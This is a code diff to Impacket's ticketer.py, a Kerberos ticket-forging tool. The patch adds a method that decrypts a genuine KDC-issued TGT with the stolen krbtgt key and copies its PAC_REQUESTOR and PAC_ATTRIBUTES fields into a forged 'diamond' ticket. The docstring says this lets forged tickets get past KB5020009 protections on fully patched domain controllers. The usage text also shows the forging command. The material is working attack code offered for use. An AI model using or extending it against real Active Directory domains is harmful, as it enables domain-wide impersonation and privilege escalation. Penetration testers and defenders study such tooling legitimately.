@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # Impacket - Collection of Python classes for working with network protocols.
 #
-# Copyright Fortra, LLC and its affiliated companies 
+# Copyright Fortra, LLC and its affiliated companies
 #
 # All rights reserved.
 #
@@ -80,7 +80,7 @@ from impacket.krb5.pac import KERB_SID_AND_ATTRIBUTES, PAC_SIGNATURE_DATA, PAC_L
     VALIDATION_INFO, PAC_CLIENT_INFO, KERB_VALIDATION_INFO, UPN_DNS_INFO_FULL, PAC_REQUESTOR_INFO, PAC_UPN_DNS_INFO, PAC_ATTRIBUTES_INFO, PAC_REQUESTOR, \
     PAC_ATTRIBUTE_INFO
 from impacket.krb5.types import KerberosTime, Principal
-from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
+from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS, getKerberosTGSRequestEnctypes
 
 from impacket.krb5 import constants, pac
 from impacket.krb5.asn1 import AP_REQ, TGS_REQ, Authenticator, seq_set, seq_set_iter, PA_FOR_USER_ENC, Ticket as TicketAsn1
@@ -345,6 +345,55 @@ class TICKETER:
         pacRequestor['UserSid'].fromCanonical(f"{self.__options.domain_sid}-{self.__options.user_id}")
 
         pacInfos[PAC_REQUESTOR_INFO] = pacRequestor.getData()
+    def _extractOriginalPacFields(self, kdcRep):
+        """Extract PAC_REQUESTOR and PAC_ATTRIBUTES from the real KDC-issued TGT.
+
+        When forging a diamond ticket (-request), the KDC's PAC contains a valid
+        PAC_REQUESTOR (KB5008380/KB5020009) that we must preserve. Without it,
+        fully-patched KDCs reject the TGS-REQ during cross-realm referral with
+        substatus 0x520 (KDC_ERR_TGT_REVOKED).
+        """
+        preserved = {}
+        try:
+            ticketCipher = int(kdcRep['ticket']['enc-part']['etype'])
+            cipherText = kdcRep['ticket']['enc-part']['cipher'].asOctets()
+
+            # Build the krbtgt key to decrypt the ticket's enc-part
+            if ticketCipher == EncryptionTypes.rc4_hmac.value:
+                key = Key(ticketCipher, unhexlify(self.__options.nthash))
+            else:
+                key = Key(ticketCipher, unhexlify(self.__options.aesKey))
+
+            cipher = _enctype_table[ticketCipher]
+            plainText = cipher.decrypt(key, 2, cipherText)
+            encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]
+
+            # Walk authorization-data to find the PAC
+            adIfRelevant = decoder.decode(
+                encTicketPart['authorization-data'][0]['ad-data'],
+                asn1Spec=AD_IF_RELEVANT()
+            )[0]
+            pacType = pac.PACTYPE(adIfRelevant[0]['ad-data'].asOctets())
+            buff = pacType['Buffers']
+
+            for _ in range(pacType['cBuffers']):
+                infoBuffer = pac.PAC_INFO_BUFFER(buff)
+                data = pacType['Buffers'][infoBuffer['Offset'] - 8:][:infoBuffer['cbBufferSize']]
+                buff = buff[len(infoBuffer):]
+
+                if infoBuffer['ulType'] == PAC_REQUESTOR_INFO:
+                    preserved[PAC_REQUESTOR_INFO] = data
+                    logging.info('    Preserved original PAC_REQUESTOR from KDC')
+                elif infoBuffer['ulType'] == PAC_ATTRIBUTES_INFO:
+                    preserved[PAC_ATTRIBUTES_INFO] = data
+                    logging.info('    Preserved original PAC_ATTRIBUTES from KDC')
+
+        except Exception as e:
+            logging.warning('Could not extract original PAC fields: %s' % str(e))
+            logging.warning('Falling back to fabricated PAC_REQUESTOR (may fail on patched KDCs)')
+
+        return preserved
+
 
     def createBasicTicket(self):
         if self.__options.request is True:
@@ -480,6 +529,19 @@ class TICKETER:
 
         pacInfos = self.createBasicPac(kdcRep)
 
+        # Diamond ticket: preserve original PAC_REQUESTOR/PAC_ATTRIBUTES from
+        # the real KDC-issued TGT so that KB5020009 enforcement passes during
+        # cross-realm referral TGS-REQ.
+        if (self.__options.request is True and not self.__options.impersonate
+                and not self.__options.old_pac
+                and self.__options.user.lower() == self.__target.lower()):
+
+            originalPacFields = self._extractOriginalPacFields(kdcRep)
+            if PAC_REQUESTOR_INFO in originalPacFields:
+                pacInfos[PAC_REQUESTOR_INFO] = originalPacFields[PAC_REQUESTOR_INFO]
+            if PAC_ATTRIBUTES_INFO in originalPacFields:
+                pacInfos[PAC_ATTRIBUTES_INFO] = originalPacFields[PAC_ATTRIBUTES_INFO]
+
         return kdcRep, pacInfos
 
 
@@ -604,8 +666,7 @@ class TICKETER:
 
         reqBody['till'] = KerberosTime.to_asn1(now)
         reqBody['nonce'] = random.getrandbits(31)
-        seq_set_iter(reqBody, 'etype',
-                     (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))
+        seq_set_iter(reqBody, 'etype', getKerberosTGSRequestEnctypes())
 
         seq_set_iter(reqBody, 'additional-tickets', (ticket.to_asn1(TicketAsn1()),))
 
@@ -1044,7 +1105,7 @@ if __name__ == '__main__':
         print("\tIf you specify -aesKey instead of -ntHash everything will be encrypted using AES128 or AES256")
         print("\t(depending on the key specified). No traffic is generated against the KDC. Ticket will be saved as")
         print("\tbaduser.ccache.\n")
-        print("\t./ticketer.py -nthash <krbtgt/service nthash> -aesKey <krbtgt/service AES> -domain-sid <your domain SID> -domain " 
+        print("\t./ticketer.py -nthash <krbtgt/service nthash> -aesKey <krbtgt/service AES> -domain-sid <your domain SID> -domain "
               "<your domain FQDN> -request -user <a valid domain user> -password <valid domain user's password> baduser\n")
         print("\twill first authenticate against the KDC (using -user/-password) and get a TGT that will be used")
         print("\tas template for customization. Whatever encryption algorithms used on that ticket will be honored,")
